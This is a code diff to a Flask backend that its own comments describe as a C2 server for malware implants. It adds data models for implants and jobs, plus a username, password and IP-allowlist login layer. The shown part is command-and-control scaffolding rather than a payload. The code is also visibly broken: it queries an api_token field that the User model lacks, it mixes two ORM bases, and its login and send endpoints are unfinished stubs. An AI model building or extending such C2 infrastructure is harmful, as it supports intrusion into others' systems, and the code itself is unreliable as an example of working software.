@@ -1,5 +1,52 @@
+from flask import Flask, json, jsonify, url_for, request, make_response, abort
+from os import path as os_path, getcwd, makedirs, path
+from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy import ForeignKey, select
+from sqlalchemy.orm import DeclarativeBase, Mapped, Session, mapped_column, relationship
+from werkzeug.middleware.proxy_fix import ProxyFix
+from pprint import pprint
 from enum import Enum
 
+import base64
+import os
+import shutil
+import hashlib
+import uuid
+import bcrypt
+
+app = Flask(__name__)
+app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os_path.join(app.root_path, '..', 'data.db')
+app.app_context().push()
+db = SQLAlchemy(app)
+
+"""
+    These classes form a user + password + ip auth system for the server.
+"""
+class Base(DeclarativeBase):
+    pass
+
+class User(Base):
+    __tablename__ = 'users'
+    
+    id: Mapped[int] = mapped_column(primary_key=True)
+    username: Mapped[str] = mapped_column(db.String(50), unique=True, index=True)
+    password_hash: Mapped[str] = mapped_column(db.String(128))
+
+    safe_ips: Mapped[list["SafeIP"]] = relationship(back_populates="user", cascade="all, delete-orphan")
+
+class SafeIP(Base):
+    __tablename__ = 'safe_ips'
+    
+    id: Mapped[int] = mapped_column(primary_key=True)
+    ip_address: Mapped[str] = mapped_column(db.String(45), index=True)
+    user_id: Mapped[int] = mapped_column(ForeignKey('users.id'))
+
+    user: Mapped["User"] = relationship(back_populates="safe_ips")
+
+"""
+    These classes define the structure of the C2 Server and the databases behind it.
+"""
 class ImplantStatus(Enum):
     REGISTERING = 1
     SLEEPING = 2
@@ -38,23 +85,6 @@ class ProcessArch(Enum):
     X64 = 2
     ARM = 3
     ARM64 = 4
-
-from flask import Flask, json, jsonify, url_for, request, make_response, abort
-from os import path as os_path
-from flask_sqlalchemy import SQLAlchemy
-from werkzeug.middleware.proxy_fix import ProxyFix
-
-import base64
-import os
-import shutil
-import hashlib
-import uuid
-
-app = Flask(__name__)
-app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///' + os_path.join(app.root_path, '..', 'data.db')
-app.app_context().push()
-db = SQLAlchemy(app)
 
 class Implant(db.Model):
     __tablename__ = 'implants'
@@ -235,3 +265,27 @@ class Job(db.Model):
             'updated': self.updated.isoformat()
         }
 
+def verify_user_access(session: Session, token: str, request_ip: str) -> User | None:
+    stmt = select(User).where(User.api_token == token)
+    user = session.scalars(stmt).first()
+
+    if not user:
+        return None
+    allowed_ips = [ip.ip_address for ip in user.safe_ips]
+    if request_ip not in allowed_ips:
+        return None
+    return user
+
+db.create_all()
+
+@app.post('/api/cli/login')
+def login():
+    data = request.json or {}
+    username = data.get("username")
+    password = data.get("password")
+    client_ip = request.remote_addr
+
+@app.route('/api/send', methods=['POST'])
+def send():
+    if request.is_json:
+        print("thing")
